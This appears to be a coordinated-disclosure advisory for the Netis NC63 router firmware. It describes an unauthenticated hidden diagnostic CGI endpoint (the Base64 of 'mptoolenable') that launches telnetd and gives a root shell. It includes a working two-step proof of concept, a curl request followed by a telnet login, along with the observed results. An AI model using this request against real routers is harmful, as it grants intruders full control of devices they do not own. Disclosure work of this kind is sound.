# Netis NC63 — Unauthenticated hidden diagnostic endpoint enables telnetd and yields a root shell

> **Status:** CVE: Not assigned (identifier requested). Vendor notification: pending. Repository published for coordinated disclosure.

## Summary

An authentication bypass vulnerability was discovered in Netis NC63 firmware V3.0.0.3327. The Boa web
server forwards every request whose path ends in `.cgi` to the `netis.cgi` dispatcher without an
authorization check. One of the dispatched endpoints is a hidden diagnostic handler whose name is the
Base64 encoding of `mptoolenable`. Requesting it starts the BusyBox telnet daemon on TCP/23 with root
privileges, and the diagnostic account then provides a `uid=0` shell.

## Affected Product

| | |
|---|---|
| Vendor | Netis |
| Product | NC63 |
| Firmware | V3.0.0.3327 (version string reported by the device: `Netis(NC63)-V3.0.0.3327`) |
| Architecture | MIPS32 little-endian, uClibc, no PIE |
| Component | `/bin/netis.cgi` (151 KB dispatcher) |
| Type | Missing Authentication for Critical Function (CWE-306), CWE-912 Hidden Functionality |
| Authentication required | **None** |

## Root Cause

The dispatch table at `0x00434080` pairs endpoint names with handlers; the entry for
`bXB0b29sZW5hYmxl.cgi` points to `FUN_0040e460`. `FUN_0040e460` never reads `/tmp/boa_auth` — the file
the rest of the CGI uses as its authentication state — and calls `system()` with the telnetd start-up
command. Because Boa routes every `*.cgi` path to `netis.cgi` before any authorization logic runs, the
handler is reachable by anyone who can open TCP/80.

> **Note on the dispatch table.** An earlier internal note counted 16 table entries and placed this
> handler at index 6; a later revision counted 10 dispatched endpoints and placed it at index 5. The
> description above refers to the entry by its endpoint name rather than by index, so it does not depend
> on which count is correct. The index should be re-confirmed in Ghidra before the entry is cited
> externally.

## Proof of Concept (non-destructive)

```
1) Trigger the hidden endpoint (no credentials, no cookie):
   curl -i http://<router>/cgi-bin/bXB0b29sZW5hYmxl.cgi
   Observed: HTTP/1.0 200 OK and a success body; the CGI exits cleanly.

2) Connect to the now-running telnet service:
   telnet <router> 23
   Observed: telnetd accepts the connection and the diagnostic account provides a uid=0 shell.
```

`bXB0b29sZW5hYmxl` is the Base64 encoding of `mptoolenable` (the factory test-tool switch).

### Observed result

HTTP 200 with a success body; `netstat` shows TCP/23 listening immediately afterwards (and no listener
beforehand); `ps` shows `telnetd` running as root; a telnet session yields `uid=0(root)`. Control test:
requesting an ordinary CGI does not start telnetd.

### Evidence

[`evidence/backdoor_telnet.txt`](evidence/backdoor_telnet.txt) — serial-console capture taken from the
rehosted device: port 23 closed before, unauthenticated request, telnetd running, `uid=0` shell
obtained. The exact request is in [`poc/request.txt`](poc/request.txt).

## Impact

Any host that can reach the management interface obtains full root control without credentials:
persistent firmware modification, traffic interception, lateral movement. The LAN vector (`AV:A`) is
scored; if the interface is exposed to WAN, `AV:N` applies and the score becomes 9.8.

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.8** (researcher self-assessment).

## Repository files

| File | Content |
|---|---|
| `README.md` | This advisory |
| `poc/request.txt` | The exact HTTP request that triggers the hidden endpoint |
| `evidence/backdoor_telnet.txt` | Serial-console capture of the full chain |

## Discovery

Discovered by Zimo-666 on 2026-10-17 via firmware rehosting (QEMU system emulation of the vendor image)
and static reverse engineering with Ghidra. Vendor notified: pending. All testing was performed against
an isolated emulated device; no production hardware or third-party network was touched.
